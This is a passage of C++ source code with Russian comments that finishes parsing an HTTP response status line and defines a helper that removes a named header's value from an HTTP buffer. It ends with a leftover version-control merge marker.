	PCHAR Tmp = StrNew(Start, End - Start);
    Code = (DWORD)StrToInt(Tmp);
	StrFree(Tmp);

	// Определяем строку ответа
	Start = End;
	IgnoreSpaces(Start);
	End = StrEnd(Start);
	StatusLine = StrNew(Start, End - Start);

	return Protocol != NULL && Code != 0;

}
//---------------------------------------------------------------------------

//*****************************************************************************
// Методы для работы с HTTP данными
//*****************************************************************************
PCHAR HTTPUtils::DeleteHeaderValue(PCHAR Buf, int &Size, PCHAR Header)
{
	// Функция указанный HTTP заголовок
	if (StrIsEmpty(Buf) || StrIsEmpty(Header)) return Buf;
	if (Size == 0)
		Size = StrCalcLength(Buf);

	int Pos = StrPos(Buf, Header);
	if (Pos < 0) return Buf;
	PCHAR Start = Buf + Pos;
	while (*Start != 0 && *Start != ':') Start++;
	Start++;
		
	PCHAR End = Start;

	// Переходим на следующую строку
	while (*End != 0 && *End != 10 && *End != 13) End++;

	DWORD Delta = End - Start;
    DWORD CopySize = Size - (End - Buf);
    m_memcpy(Start, End, CopySize);

	Size -= Delta;
	*(Buf + Size) = 0;
    return Buf;

}

>>>>>>> .r109
